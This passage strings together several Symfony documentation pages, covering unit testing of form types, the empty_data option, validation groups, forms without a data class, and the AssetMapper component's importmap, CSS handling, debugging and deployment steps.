method is only set to ``false`` if a data transformer throws an exception::

    $form->submit($formData);
    $this->assertTrue($form->isSynchronized());

.. note::

    Don't test the validation: it is applied by a listener that is not
    active in the test case and it relies on validation configuration.
    Instead, unit test your custom constraints directly or read how
    to :ref:`add custom extensions <form_unit_testing-adding_custom_extensions>`
    in the last section of this page.

Next, verify the submission and mapping of the form. The test below checks if
all the fields are correctly specified::

    $this->assertEquals($expected, $formData);

Finally, check the creation of the ``FormView``. You can check that a custom
variable exists and will be available in your form themes::

    $this->assertArrayHasKey('custom_var', $view->vars);
    $this->assertSame('expected value', $view->vars['custom_var']);

.. tip::

    Use `PHPUnit data providers`_ to test multiple form conditions using
    the same test code.

.. caution::

    When your type relies on the ``EntityType``, you should register the
    :class:`Symfony\\Bridge\\Doctrine\\Form\\DoctrineOrmExtension`, which will
    need to mock the ``ManagerRegistry``.

    However, If you cannot use a mock to write your test, you should extend
    the ``KernelTestCase`` instead and use the ``form.factory`` service to
    create the form.

Testing Types Registered as Services
------------------------------------

Your form may be used as a service, as it depends on other services (e.g. the
Doctrine entity manager). In these cases, using the above code won't work, as
the Form component instantiates the form type without passing any arguments
to the constructor.

To solve this, you have to mock the injected dependencies, instantiate your own
form type and use the :class:`Symfony\\Component\\Form\\PreloadedExtension` to
make sure the ``FormRegistry`` uses the created instance::

    // tests/Form/Type/TestedTypeTest.php
    namespace App\Tests\Form\Type;

    use App\Form\Type\TestedType;
    use Doctrine\ORM\EntityManager;
    use Symfony\Component\Form\PreloadedExtension;
    use Symfony\Component\Form\Test\TypeTestCase;
    // ...

    class TestedTypeTest extends TypeTestCase
    {
        private MockObject&EntityManager $entityManager;

        protected function setUp(): void
        {
            // mock any dependencies
            $this->entityManager = $this->createMock(EntityManager::class);

            parent::setUp();
        }

        protected function getExtensions(): array
        {
            // create a type instance with the mocked dependencies
            $type = new TestedType($this->entityManager);

            return [
                // register the type instances with the PreloadedExtension
                new PreloadedExtension([$type], []),
            ];
        }

        public function testSubmitValidData(): void
        {
            // ...

            // Instead of creating a new instance, the one created in
            // getExtensions() will be used.
            $form = $this->factory->create(TestedType::class, $formData);

            // ... your test
        }
    }

.. _form_unit_testing-adding_custom_extensions:

Adding Custom Extensions
------------------------

It often happens that you use some options that are added by
:doc:`form extensions </form/create_form_type_extension>`. One of the
cases may be the ``ValidatorExtension`` with its ``invalid_message`` option.
The ``TypeTestCase`` only loads the core form extension, which means an
:class:`Symfony\\Component\\OptionsResolver\\Exception\\InvalidOptionsException`
will be raised if you try to test a class that depends on other extensions.
The :method:`Symfony\\Component\\Form\\Test\\TypeTestCase::getExtensions` method
allows you to return a list of extensions to register::

    // tests/Form/Type/TestedTypeTest.php
    namespace App\Tests\Form\Type;

    // ...
    use Symfony\Component\Form\Extension\Validator\ValidatorExtension;
    use Symfony\Component\Validator\Validation;

    class TestedTypeTest extends TypeTestCase
    {
        protected function getExtensions(): array
        {
            $validator = Validation::createValidator();

            // or if you also need to read constraints from annotations
            $validator = Validation::createValidatorBuilder()
                ->enableAttributeMapping()
                ->getValidator();

            return [
                new ValidatorExtension($validator),
            ];
        }

        // ... your tests
    }

.. note::

    By default only the
    :class:`Symfony\\Component\\Form\\Extension\\Core\\CoreExtension` is
    registered in tests. You can find other extensions from the Form component
    in the ``Symfony\Component\Form\Extension`` namespace.

It is also possible to load custom form types, form type extensions or type
guessers using the :method:`Symfony\\Component\\Form\\Test\\FormIntegrationTestCase::getTypes`,
:method:`Symfony\\Component\\Form\\Test\\FormIntegrationTestCase::getTypeExtensions`
and :method:`Symfony\\Component\\Form\\Test\\FormIntegrationTestCase::getTypeGuessers`
methods.

When testing the themes of your forms, consider making your test extend the
:class:`Symfony\\Bridge\\Twig\\Test\\FormLayoutTestCase` class. This saves a lot
of boilerplate and code duplication by implementing the
:class:`Symfony\\Component\\Form\\Test\\FormIntegrationTestCase` methods for you.
All you need to do is to implement the
:method:`Symfony\\Bridge\\Twig\\Test\\FormLayoutTestCase::getTemplatePaths`, the
:method:`Symfony\\Bridge\\Twig\\Test\\FormLayoutTestCase::getTwigExtensions` and
the :method:`Symfony\\Bridge\\Twig\\Test\\FormLayoutTestCase::getThemes` methods.

.. _`PHPUnit data providers`: https://docs.phpunit.de/en/9.6/writing-tests-for-phpunit.html#data-providers
How to Configure empty Data for a Form Class
============================================

The ``empty_data`` option allows you to specify an empty data set for your
form class. This empty data set would be used if you submit your form, but
haven't called ``setData()`` on your form or passed in data when you created
your form. For example, in a controller::

    public function index(): Response
    {
        $blog = ...;

        // $blog is passed in as the data, so the empty_data
        // option is not needed
        $form = $this->createForm(BlogType::class, $blog);

        // no data is passed in, so empty_data is
        // used to get the "starting data"
        $form = $this->createForm(BlogType::class);
    }

By default, ``empty_data`` is set to ``null``. Or, if you have specified
a ``data_class`` option for your form class, it will default to a new instance
of that class. That instance will be created by calling the constructor
with no arguments.

If you want to override this default behavior, there are two ways to do this:

* `Option 1: Instantiate a new Class`_
* `Option 2: Provide a Closure`_

If you didn't set the ``data_class`` option, you can pass the initial data as
string or pass an array of strings (where the key matches the field name) when
the form type is compound.

Option 1: Instantiate a new Class
---------------------------------

One reason you might use this option is if you want to use a constructor
that takes arguments. Remember, the default ``data_class`` option calls
that constructor with no arguments::

    // src/Form/Type/BlogType.php
    namespace App\Form\Type;

    // ...
    use App\Entity\Blog;
    use Symfony\Component\Form\AbstractType;
    use Symfony\Component\OptionsResolver\OptionsResolver;

    class BlogType extends AbstractType
    {
        public function __construct(
            private object $someDependency,
        ) {
        }
        // ...

        public function configureOptions(OptionsResolver $resolver): void
        {
            $resolver->setDefaults([
                'empty_data' => new Blog($this->someDependency),
            ]);
        }
    }

You can instantiate your class however you want. In this example, you pass
some dependency into the ``BlogType`` then use that to instantiate the ``Blog`` class.
The point is, you can set ``empty_data`` to the exact "new" object that you want to use.

.. tip::

    In order to pass arguments to the ``BlogType`` constructor, you'll need to
    :ref:`register the form as a service <service-container-creating-service>`
    and :doc:`tag it </service_container/tags>` with ``form.type``.
    If you're using the
    :ref:`default services.yaml configuration <service-container-services-load-example>`,
    this is already done for you.

.. _forms-empty-data-closure:

Option 2: Provide a Closure
---------------------------

Using a closure is the preferred method, since it will only create the object
if it is needed.

The closure must accept a ``FormInterface`` instance as the first argument::

    use Symfony\Component\Form\FormInterface;
    use Symfony\Component\OptionsResolver\OptionsResolver;
    // ...

    public function configureOptions(OptionsResolver $resolver): void
    {
        $resolver->setDefaults([
            'empty_data' => function (FormInterface $form): Blog {
                return new Blog($form->get('title')->getData());
            },
        ]);
    }
How to Dynamically Configure Form Validation Groups
===================================================

Sometimes you need advanced logic to determine the validation groups. If they
can't be determined by a callback, you can use a service. Create a service
that implements ``__invoke()`` which accepts a ``FormInterface`` as a
parameter::

    // src/Validation/ValidationGroupResolver.php
    namespace App\Validation;

    use Symfony\Component\Form\FormInterface;

    class ValidationGroupResolver
    {
        public function __construct(
            private object $service1,
            private object $service2,
        ) {
        }

        public function __invoke(FormInterface $form): array
        {
            $groups = [];

            // ... determine which groups to apply and return an array

            return $groups;
        }
    }

Then in your form, inject the resolver and set it as the ``validation_groups``::

    // src/Form/MyClassType.php;
    namespace App\Form;

    use App\Validation\ValidationGroupResolver;
    use Symfony\Component\Form\AbstractType;
    use Symfony\Component\OptionsResolver\OptionsResolver;

    class MyClassType extends AbstractType
    {
        public function __construct(
            private ValidationGroupResolver $groupResolver,
        ) {
        }

        // ...
        public function configureOptions(OptionsResolver $resolver): void
        {
            $resolver->setDefaults([
                'validation_groups' => $this->groupResolver,
            ]);
        }
    }

This will result in the form validator invoking your group resolver to set the
validation groups returned when validating.
How to Define the Validation Groups to Use
==========================================

Validation Groups
-----------------

If your object takes advantage of :doc:`validation groups </validation/groups>`,
you'll need to specify which validation group(s) your form should use. Pass
this as an option when :ref:`creating forms in controllers <creating-forms-in-controllers>`::

    $form = $this->createFormBuilder($user, [
        'validation_groups' => ['registration'],
    ])->add(/* ... */);

When :ref:`creating forms in classes <creating-forms-in-classes>`, add the
following to the ``configureOptions()`` method::

    use Symfony\Component\OptionsResolver\OptionsResolver;

    public function configureOptions(OptionsResolver $resolver): void
    {
        $resolver->setDefaults([
            // ...
            'validation_groups' => ['registration'],
        ]);
    }

In both of these cases, *only* the ``registration`` validation group will
be used to validate the underlying object. To apply the ``registration``
group *and* all constraints that are not in a group, use::

    'validation_groups' => ['Default', 'registration']

.. note::

    You can choose any name for your validation groups, but Symfony recommends
    using "lower snake case" names (e.g. ``foo_bar``) in contrast with the
    automatic validation groups created by Symfony, which use "upper camel case"
    (e.g. ``Default``, ``SomeClassName``).
How to Use a Form without a Data Class
======================================

In most cases, a form is tied to an object, and the fields of the form get
and store their data on the properties of that object. This is what
:doc:`the main article on forms </forms>` is about.

But sometimes, you may want to use a form without a class, and get back an
array of the submitted data. The ``getData()`` method allows you to do
exactly that::

    // src/Controller/ContactController.php
    namespace App\Controller;

    use Symfony\Bundle\FrameworkBundle\Controller\AbstractController;
    use Symfony\Component\HttpFoundation\Request;
    use Symfony\Component\HttpFoundation\Response;
    // ...

    class ContactController extends AbstractController
    {
        public function contact(Request $request): Response
        {
            $defaultData = ['message' => 'Type your message here'];
            $form = $this->createFormBuilder($defaultData)
                ->add('name', TextType::class)
                ->add('email', EmailType::class)
                ->add('message', TextareaType::class)
                ->add('send', SubmitType::class)
                ->getForm();

            $form->handleRequest($request);

            if ($form->isSubmitted() && $form->isValid()) {
                // data is an array with "name", "email", and "message" keys
                $data = $form->getData();
            }

            // ... render the form
        }
    }

By default, a form actually assumes that you want to work with arrays of
data, instead of an object. There are exactly two ways that you can change
this behavior and tie the form to an object instead:

#. Pass an object when creating the form (as the first argument to ``createFormBuilder()``
   or the second argument to ``createForm()``);

#. Declare the ``data_class`` option on your form.

If you *don't* do either of these, then the form will return the data as
an array. In this example, since ``$defaultData`` is not an object (and
no ``data_class`` option is set), ``$form->getData()`` ultimately returns
an array.

.. tip::

    You can also access POST values (in this case "name") directly through
    the request object, like so::

        $request->getPayload()->get('name');

    Be advised, however, that in most cases using the ``getData()`` method is
    a better choice, since it returns the data (usually an object) after
    it's been transformed by the Form component.

Adding Validation
-----------------

The only missing piece is validation. Usually, when you call ``$form->handleRequest($request)``,
the object is validated by reading the constraints that you applied to that
class. If your form is mapped to an object (i.e. you're using the ``data_class``
option or passing an object to your form), this is almost always the approach
you want to use. See :doc:`/validation` for more details.

.. _form-option-constraints:

But if the form is not mapped to an object and you instead want to retrieve an
array of your submitted data, how can you add constraints to the data of
your form?

Constraints At Field Level
~~~~~~~~~~~~~~~~~~~~~~~~~~

One possibility is to set up the constraints yourself, and attach them to the individual
fields. The overall approach is covered a bit more in :doc:`this validation article </validation/raw_values>`,
but here's a short example::

    use Symfony\Component\Form\Extension\Core\Type\TextType;
    use Symfony\Component\Form\FormBuilderInterface;
    use Symfony\Component\Validator\Constraints\Length;
    use Symfony\Component\Validator\Constraints\NotBlank;

    public function buildForm(FormBuilderInterface $builder, array $options): void
    {
        $builder
            ->add('firstName', TextType::class, [
                'constraints' => new Length(['min' => 3]),
            ])
            ->add('lastName', TextType::class, [
                'constraints' => [
                    new NotBlank(),
                    new Length(['min' => 3]),
                ],
            ])
        ;
    }

.. tip::

    If you are using validation groups, you need to either reference the
    ``Default`` group when creating the form, or set the correct group on
    the constraint you are adding::

        new NotBlank(['groups' => ['create', 'update']]);

.. tip::

    If the form is not mapped to an object, every object in your array of
    submitted data is validated using the ``Symfony\Component\Validator\Constraints\Valid``
    constraint, unless you :doc:`disable validation </form/disabling_validation>`.

.. caution::

    When a form is only partially submitted (for example, in an HTTP PATCH
    request), only the constraints from the submitted form fields will be
    evaluated.

Constraints At Class Level
~~~~~~~~~~~~~~~~~~~~~~~~~~

Another possibility is to add the constraints at the class level.
This can be done by setting the ``constraints`` option in the
``configureOptions()`` method::

    use Symfony\Component\Form\Extension\Core\Type\TextType;
    use Symfony\Component\Form\FormBuilderInterface;
    use Symfony\Component\OptionsResolver\OptionsResolver;
    use Symfony\Component\Validator\Constraints\Length;
    use Symfony\Component\Validator\Constraints\NotBlank;

    public function buildForm(FormBuilderInterface $builder, array $options): void
    {
        $builder
            ->add('firstName', TextType::class)
            ->add('lastName', TextType::class);
    }

    public function configureOptions(OptionsResolver $resolver): void
    {
        $constraints = [
            'firstName' => new Length(['min' => 3]),
            'lastName' => [
                new NotBlank(),
                new Length(['min' => 3]),
            ],
        ];

        $resolver->setDefaults([
            'data_class' => null,
            'constraints' => $constraints,
        ]);
    }

This means you can also do this when using the ``createFormBuilder()`` method
in your controller::

    $form = $this->createFormBuilder($defaultData, [
            'constraints' => [
                'firstName' => new Length(['min' => 3]),
                'lastName' => [
                    new NotBlank(),
                    new Length(['min' => 3]),
                ],
            ],
        ])
        ->add('firstName', TextType::class)
        ->add('lastName', TextType::class)
        ->getForm();
AssetMapper: Simple, Modern CSS & JS Management
===============================================

The AssetMapper component lets you write modern JavaScript and CSS without the complexity
of using a bundler. Browsers *already* support many modern JavaScript features
like the ``import`` statement and ES6 classes. And the HTTP/2 protocol means that
combining your assets to reduce HTTP connections is no longer urgent. This component
is a light layer that helps serve your files directly to the browser.

The component has two main features:

* :ref:`Mapping & Versioning Assets <mapping-assets>`: All files inside of ``assets/``
  are made available publicly and **versioned**. You can reference the file
  ``assets/images/product.jpg`` in a Twig template with ``{{ asset('images/product.jpg') }}``.
  The final URL will include a version hash, like ``/assets/images/product-3c16d9220694c0e56d8648f25e6035e9.jpg``.

* :ref:`Importmaps <importmaps-javascript>`: A native browser feature that makes it easier
  to use the JavaScript ``import`` statement (e.g. ``import { Modal } from 'bootstrap'``)
  without a build system. It's supported in all browsers (thanks to a shim)
  and is part of the `HTML standard <https://html.spec.whatwg.org/multipage/webappapis.html#import-maps>`_.

Installation
------------

To install the AssetMapper component, run:

.. code-block:: terminal

    $ composer require symfony/asset-mapper symfony/asset symfony/twig-pack

In addition to ``symfony/asset-mapper``, this also makes sure that you have the
:doc:`Asset Component </components/asset>` and Twig available.

If you're using :ref:`Symfony Flex <symfony-flex>`, you're done! The recipe just
added a number of files:

* ``assets/app.js`` Your main JavaScript file;
* ``assets/styles/app.css`` Your main CSS file;
* ``config/packages/asset_mapper.yaml`` Where you define your asset "paths";
* ``importmap.php`` Your importmap config file.

It also *updated* the ``templates/base.html.twig`` file:

.. code-block:: diff

    {% block javascripts %}
    +    {% block importmap %}{{ importmap('app') }}{% endblock %}
    {% endblock %}

If you're not using Flex, you'll need to create & update these files manually. See
the `latest asset-mapper recipe`_ for the exact content of these files.

.. _mapping-assets:

Mapping and Referencing Assets
------------------------------

The AssetMapper component works by defining directories/paths of assets that you want to expose
publicly. These assets are then versioned and easy to reference. Thanks to the
``asset_mapper.yaml`` file, your app starts with one mapped path: the ``assets/``
directory.

If you create an ``assets/images/duck.png`` file, you can reference it in a template with:

.. code-block:: html+twig

    <img src="{{ asset('images/duck.png') }}">

The path - ``images/duck.png`` - is relative to your mapped directory (``assets/``).
This is known as the **logical path** to your asset.

If you look at the HTML in your page, the URL will be something
like: ``/assets/images/duck-3c16d9220694c0e56d8648f25e6035e9.png``. If you change
the file, the version part of the URL will also change automatically.

Serving Assets in dev vs prod
~~~~~~~~~~~~~~~~~~~~~~~~~~~~~

In the ``dev`` environment, the URL ``/assets/images/duck-3c16d9220694c0e56d8648f25e6035e9.png``
is handled and returned by your Symfony app.

For the ``prod`` environment, before deploy, you should run:

.. code-block:: terminal

    $ php bin/console asset-map:compile

This will physically copy all the files from your mapped directories to
``public/assets/`` so that they're served directly by your web server.
See :ref:`Deployment <asset-mapper-deployment>` for more details.

.. tip::

    If you need to copy the compiled assets to a different location (e.g. upload
    them to S3), create a service that implements ``Symfony\Component\AssetMapper\Path\PublicAssetsFilesystemInterface``
    and set its service id (or an alias) to ``asset_mapper.local_public_assets_filesystem``
    (to replace the built-in service).

Debugging: Seeing All Mapped Assets
~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~

To see all of the mapped assets in your app, run:

.. code-block:: terminal

    $ php bin/console debug:asset-map

This will show you all the mapped paths and the assets inside of each:

.. code-block:: text

    AssetMapper Paths
    ------------------

    --------- ------------------
     Path      Namespace prefix
    --------- ------------------
    assets

    Mapped Assets
    -------------

    ------------------ ----------------------------------------------------
     Logical Path       Filesystem Path
    ------------------ ----------------------------------------------------
     app.js             assets/app.js
     styles/app.css     assets/styles/app.css
     images/duck.png    assets/images/duck.png

The "Logical Path" is the path to use when referencing the asset, like
from a template.

.. _importmaps-javascript:

Importmaps & Writing JavaScript
-------------------------------

All modern browsers support the JavaScript `import statement`_ and modern
`ES6`_ features like classes. So this code "just works":

.. code-block:: javascript

    // assets/app.js
    import Duck from './duck.js';

    const duck = new Duck('Waddles');
    duck.quack();

.. code-block:: javascript

    // assets/duck.js
    export default class {
        constructor(name) {
            this.name = name;
        }
        quack() {
            console.log(`${this.name} says: Quack!`);
        }
    }

Thanks to the ``{{ importmap('app') }}`` Twig function call, which you'll learn about in
this section, the ``assets/app.js`` file is loaded & executed by the browser.

.. tip::

    When importing relative files, be sure to include the ``.js`` filename extension.
    Unlike in Node.js, this extension is required in the browser environment.

Importing 3rd Party JavaScript Packages
~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~

Suppose you want to use an `npm package`_, like `bootstrap`_. Technically,
this can be done by importing its full URL, like from a CDN:

.. code-block:: javascript

    import { Alert } from 'https://cdn.jsdelivr.net/npm/bootstrap@5.3.0/+esm';

But yikes! Needing to include that URL is a pain! Instead, we can add this package
to our "importmap" via the ``importmap:require`` command. This command can be used
to add any `npm package`_:

.. code-block:: terminal

    $ php bin/console importmap:require bootstrap

This adds the ``bootstrap`` package to your ``importmap.php`` file::

    // importmap.php
    return [
        'app' => [
            'path' => './assets/app.js',
            'entrypoint' => true,
        ],
        'bootstrap' => [
            'version' => '5.3.0',
        ],
    ];

.. note::

    Sometimes, a package - like ``bootstrap`` - will have one or more dependencies,
    such as ``@popperjs/core``. The ``importmap:require`` command will add both the
    main package *and* its dependencies. If a package includes a main CSS file,
    that will also be added (see :ref:`Handling 3rd-Party CSS <asset-mapper-3rd-party-css>`).

.. note::

    If you get a 404 error, there might be some issue with the JavaScript package
    that prevents it from being served by the ``jsDelivr`` CDN. For example, the
    package might be missing properties like ``main`` or ``module`` in its
    `package.json configuration file`_. Try to contact the package maintainer to
    ask them to fix those issues.

Now you can import the ``bootstrap`` package like usual:

.. code-block:: javascript

    import { Alert } from 'bootstrap';
    // ...

All packages in ``importmap.php`` are downloaded into an ``assets/vendor/`` directory,
which should be ignored by git (the Flex recipe adds it to ``.gitignore`` for you).
You'll need to run the following command to download the files on other computers
if some are missing:

.. code-block:: terminal

    $ php bin/console importmap:install

You can update your third-party packages to their current versions by running:

.. code-block:: terminal

    # lists outdated packages and shows their latest versions
    $ php bin/console importmap:outdated
    # updates all the outdated packages
    $ php bin/console importmap:update

    # you can also run the commands only for the given list of packages
    $ php bin/console importmap:update bootstrap lodash
    $ php bin/console importmap:outdated bootstrap lodash

How does the importmap Work?
~~~~~~~~~~~~~~~~~~~~~~~~~~~~

How does this ``importmap.php`` file allow you to import ``bootstrap``? That's
thanks to the ``{{ importmap() }}`` Twig function in ``base.html.twig``, which
outputs an `importmap`_:

.. code-block:: html

    <script type="importmap">{
        "imports": {
            "app": "/assets/app-4e986c1a2318dd050b1d47db8d856278.js",
            "/assets/duck.js": "/assets/duck-1b7a64b3b3d31219c262cf72521a5267.js",
            "bootstrap": "/assets/vendor/bootstrap/bootstrap.index-f0935445d9c6022100863214b519a1f2.js"
        }
    }</script>

Import maps are a native browser feature. When you import ``bootstrap`` from
JavaScript, the browser will look at the ``importmap`` and see that it should
fetch the package from the associated path.

.. _automatic-import-mapping:

But where did the ``/assets/duck.js`` import entry come from? That doesn't live
in ``importmap.php``. Great question!

The ``assets/app.js`` file above imports ``./duck.js``. When you import a file using a
relative path, your browser looks for that file relative to the one importing
it. So, it would look for ``/assets/duck.js``. That URL *would* be correct,
except that the ``duck.js`` file is versioned. Fortunately, the AssetMapper component
sees the import and adds a mapping from ``/assets/duck.js`` to the correct, versioned
filename. The result: importing ``./duck.js`` just works!

The ``importmap()`` function also outputs an `ES module shim`_ so that
`older browsers <https://caniuse.com/import-maps>`_ understand importmaps
(see the :ref:`polyfill config <config-importmap-polyfill>`).

.. _app-entrypoint:

The "app" Entrypoint & Preloading
~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~

An "entrypoint" is the main JavaScript file that the browser loads,
and your app starts with one by default::

    // importmap.php
    return [
        'app' => [
            'path' => './assets/app.js',
            'entrypoint' => true,
        ],
        // ...
    ];

.. _importmap-app-entry:

In addition to the importmap, the ``{{ importmap('app') }}`` in
``base.html.twig`` outputs a few other things, including:

.. code-block:: html

    <script type="module">import 'app';</script>

This line tells the browser to load the ``app`` importmap entry, which causes the
code in ``assets/app.js`` to be executed.

The ``importmap()`` function also outputs a set of "preloads":

.. code-block:: html

    <link rel="modulepreload" href="/assets/app-4e986c1a2318dd050b1d47db8d856278.js">
    <link rel="modulepreload" href="/assets/duck-1b7a64b3b3d31219c262cf72521a5267.js">

This is a performance optimization and you can learn more about below
in :ref:`Performance: Add Preloading <performance-preloading>`.

Importing Specific Files From a 3rd Party Package
~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~

Sometimes you'll need to import a specific file from a package. For example,
suppose you're integrating `highlight.js`_ and want to import just the core
and a specific language:

.. code-block:: javascript

    import hljs from 'highlight.js/lib/core';
    import javascript from 'highlight.js/lib/languages/javascript';

    hljs.registerLanguage('javascript', javascript);
    hljs.highlightAll();

In this case, adding the ``highlight.js`` package to your ``importmap.php`` file
won't work: whatever you import - e.g. ``highlight.js/lib/core`` - needs to
*exactly* match an entry in the ``importmap.php`` file.

Instead, use ``importmap:require`` and pass it the exact paths you need. This
also shows how you can require multiple packages at once:

.. code-block:: terminal

    $ php bin/console importmap:require highlight.js/lib/core highlight.js/lib/languages/javascript

Global Variables like jQuery
~~~~~~~~~~~~~~~~~~~~~~~~~~~~

You might be accustomed to relying on global variables - like jQuery's ``$``
variable:

.. code-block:: javascript

    // assets/app.js
    import 'jquery';

    // app.js or any other file
    $('.something').hide(); // WILL NOT WORK!

But in a module environment (like with AssetMapper), when you import
a library like ``jquery``, it does *not* create a global variable. Instead, you
should import it and set it to a variable in *every* file you need it:

.. code-block:: javascript

    import $ from 'jquery';
    $('.something').hide();

You can even do this from an inline script tag:

.. code-block:: html

    <script type="module">
        import $ from 'jquery';
        $('.something').hide();
    </script>

If you *do* need something to become a global variable, you do it manually
from inside ``app.js``:

.. code-block:: javascript

    import $ from 'jquery';
    // things on "window" become global variables
    window.$ = $;

Handling CSS
------------

CSS can be added to your page by importing it from a JavaScript file. The default
``assets/app.js`` already imports ``assets/styles/app.css``:

.. code-block:: javascript

    // assets/app.js
    import '../styles/app.css';

    // ...

When you call ``importmap('app')`` in ``base.html.twig``, AssetMapper parses
``assets/app.js`` (and any JavaScript files that it imports) looking for ``import``
statements for CSS files. The final collection of CSS files is rendered onto
the page as ``link`` tags in the order they were imported.

.. note::

    Importing a CSS file is *not* something that is natively supported by
    JavaScript modules. AssetMapper makes this work by adding a special importmap
    entry for each CSS file. These special entries are valid, but do nothing.
    AssetMapper adds a ``<link>`` tag for each CSS file, but when JavaScript
    executes the ``import`` statement, nothing additional happens.

.. _asset-mapper-3rd-party-css:

Handling 3rd-Party CSS
~~~~~~~~~~~~~~~~~~~~~~

Sometimes a JavaScript package will contain one or more CSS files. For example,
the ``bootstrap`` package has a `dist/css/bootstrap.min.css file`_.

You can require CSS files in the same way as JavaScript files:

.. code-block:: terminal

    $ php bin/console importmap:require bootstrap/dist/css/bootstrap.min.css

To include it on the page, import it from a JavaScript file:

.. code-block:: javascript

    // assets/app.js
    import 'bootstrap/dist/css/bootstrap.min.css';

    // ...

.. tip::

    Some packages - like ``bootstrap`` - advertise that they contain a CSS
    file. In those cases, when you ``importmap:require bootstrap``, the
    CSS file is also added to ``importmap.php`` for convenience. If some package
    doesn't advertise its CSS file in the ``style`` property of the
    `package.json configuration file`_ try to contact the package maintainer to
    ask them to add that.

Paths Inside of CSS Files
~~~~~~~~~~~~~~~~~~~~~~~~~

From inside CSS, you can reference other files using the normal CSS ``url()``
function and a relative path to the target file:

.. code-block:: css

    /* assets/styles/app.css */
    .quack {
        /* file lives at assets/images/duck.png */
        background-image: url('../images/duck.png');
    }

The path in the final ``app.css`` file will automatically include the versioned URL
for ``duck.png``:

.. code-block:: css

    /* public/assets/styles/app-3c16d9220694c0e56d8648f25e6035e9.css */
    .quack {
        background-image: url('../images/duck-3c16d9220694c0e56d8648f25e6035e9.png');
    }

.. _asset-mapper-tailwind:

Using Tailwind CSS
~~~~~~~~~~~~~~~~~~

To use the `Tailwind`_ CSS framework with the AssetMapper component, check out
`symfonycasts/tailwind-bundle`_.

.. _asset-mapper-sass:

Using Sass
~~~~~~~~~~

To use Sass with AssetMapper component, check out `symfonycasts/sass-bundle`_.

Lazily Importing CSS from a JavaScript File
~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~

If you have some CSS that you want to load lazily, you can do that via
the normal, "dynamic" import syntax:

.. code-block:: javascript

    // assets/any-file.js
    import('./lazy.css');

    // ...

In this case, ``lazy.css`` will be downloaded asynchronously and then added to
the page. If you use a dynamic import to lazily-load a JavaScript file and that
file imports a CSS file (using the non-dynamic ``import`` syntax), that CSS file
will also be downloaded asynchronously.

Issues and Debugging
--------------------

There are a few common errors and problems you might run into.

Missing importmap Entry
~~~~~~~~~~~~~~~~~~~~~~~

One of the most common errors will come from your browser's console, and
will look something like this:

    Failed to resolve module specifier "    bootstrap". Relative references must start
    with either "/", "./", or "../".

Or:

    The specifier "bootstrap" was a bare specifier, but was not remapped to anything.
    Relative module specifiers must start with "./", "../" or "/".

This means that, somewhere in your JavaScript, you're importing a 3rd party
package - e.g. ``import 'bootstrap'``. The browser tries to find this
package in your ``importmap`` file, but it's not there.

The fix is almost always to add it to your ``importmap``:

.. code-block:: terminal

    $ php bin/console importmap:require bootstrap

.. note::

    Some browsers, like Firefox, show *where* this "import" code lives, while
    others like Chrome currently do not.

404 Not Found for a JavaScript, CSS or Image File
~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~

Sometimes a JavaScript file you're importing (e.g. ``import './duck.js'``),
or a CSS/image file you're referencing won't be found, and you'll see a 404
error in your browser's console. You'll also notice that the 404 URL is missing
the version hash in the filename (e.g. a 404 to ``/assets/duck.js`` instead of
a path like ``/assets/duck.1b7a64b3b3d31219c262cf72521a5267.js``).

This is usually because the path is wrong. If you're referencing the file
directly in a Twig template:

.. code-block:: html+twig

        <img src="{{ asset('images/duck.png') }}">

Then the path that you pass ``asset()`` should be the "logical path" to the
file. Use the ``debug:asset-map`` command to see all valid logical paths
in your app.

More likely, you're importing the failing asset from a CSS file (e.g.
``@import url('other.css')``) or a JavaScript file:

.. code-block:: javascript

    // assets/controllers/farm-controller.js
    import '../farm/chicken.js';

When doing this, the path should be *relative* to the file that's importing it
(and, in JavaScript files, should start with ``./`` or ``../``). In this case,
``../farm/chicken.js`` would point to ``assets/farm/chicken.js``. To
see a list of *all* invalid imports in your app, run:

.. code-block:: terminal

    $ php bin/console cache:clear
    $ php bin/console debug:asset-map

Any invalid imports will show up as warnings on top of the screen (make sure
you have ``symfony/monolog-bundle`` installed):

.. code-block:: text

    WARNING   [asset_mapper] Unable to find asset "../images/ducks.png" referenced in "assets/styles/app.css".
    WARNING   [asset_mapper] Unable to find asset "./ducks.js" imported from "assets/app.js".

Missing Asset Warnings on Commented-out Code
~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~

The AssetMapper component looks in your JavaScript files for ``import`` lines so
that it can :ref:`automatically add them to your importmap <automatic-import-mapping>`.
This is done via regex and works very well, though it isn't perfect. If you
comment-out an import, it will still be found and added to your importmap. That
doesn't harm anything, but could be surprising.

If the imported path cannot be found, you'll see warning log when that asset
is being built, which you can ignore.

.. _asset-mapper-deployment:

Deploying with the AssetMapper Component
----------------------------------------

When you're ready to deploy, "compile" your assets by running this command:

.. code-block:: terminal

    $ php bin/console asset-map:compile

This will write all your versioned asset files into the ``public/assets/`` directory,
along with a few JSON files (``manifest.json``, ``importmap.json``, etc.) so that
the ``importmap`` can be rendered lightning fast.

.. _optimization:

Optimizing Performance
----------------------

To make your AssetMapper-powered site fly, there are a few things you need to
do. If you want to take a shortcut, you can use a service like `Cloudflare`_,
which will automatically do most of these things for you:

- **Use HTTP/2**: Your web server should be running HTTP/2 (or HTTP/3) so the
  browser can download assets in parallel. HTTP/2 is automatically enabled in Caddy
  and can be activated in Nginx and Apache. Or, proxy your site through a
  service like Cloudflare, which will automatically enable HTTP/2 for you.

- **Compress your assets**: Your web server should compress (e.g. using gzip)
  your assets (JavaScript, CSS, images) before sending them to the browser. This
  is automatically enabled in Caddy and can be activated in Nginx and Apache.
  In Cloudflare, assets are compressed by default and you can also
  enable `auto minify`_ to further compress your assets (e.g. removing
  whitespace and comments from JavaScript and CSS files).

- **Set long-lived cache expiry**: Your web server should set a long-lived
  ``Cache-Control`` HTTP header on your assets. Because the AssetMapper component includes a version
  hash in the filename of each asset, you can safely set ``max-age``
  to a very long time (e.g. 1 year). This isn't automatic in
  any web server, but can be easily enabled.

Once you've done these things, you can use a tool like `Lighthouse`_ to
check the performance of your site.

.. _performance-preloading:

Performance: Understanding Preloading
~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~

One issue that Lighthouse may report is:

    Avoid Chaining Critical Requests

To understand the problem, imagine this theoretical setup:
